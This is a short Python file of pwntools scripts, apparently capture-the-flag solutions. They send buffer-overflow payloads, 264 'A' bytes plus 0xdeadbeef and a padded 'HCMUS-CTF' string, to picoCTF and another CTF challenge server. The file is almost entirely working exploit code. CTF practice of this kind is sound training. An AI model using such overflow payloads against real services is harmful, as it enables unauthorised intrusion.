# print("1"*256 )
#print(len("111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"))
# print('A'*264 +'\xef\xbe\xad\xde')
#!/usr/bin/env python3
from pwn import *
import sys

p = remote("mars.picoctf.net","31890")  # thêm dòng này
p.recv()
offset=264
payload=b""
payload+=b"A"*offset
payload+=p64(0xdeadbeef)

p.sendline(payload)
log.info(f" {p.recvall() }")
#!/usr/bin/env python3
from pwn import *
import sys

p = remote("python-is-safe-6c5b670d41fba538.chall.ctf.blackpinker.com","443") 
p.recv()
# offset=264
# payload=b""
# payload+=b"A"*offset
# payload+=p64(0xdeadbeef)
payload = b'A' * 512 + b'HCMUS-CTF' + b'\x00' * 510

p.sendline(payload)
log.info(f" {p.recvall() }")
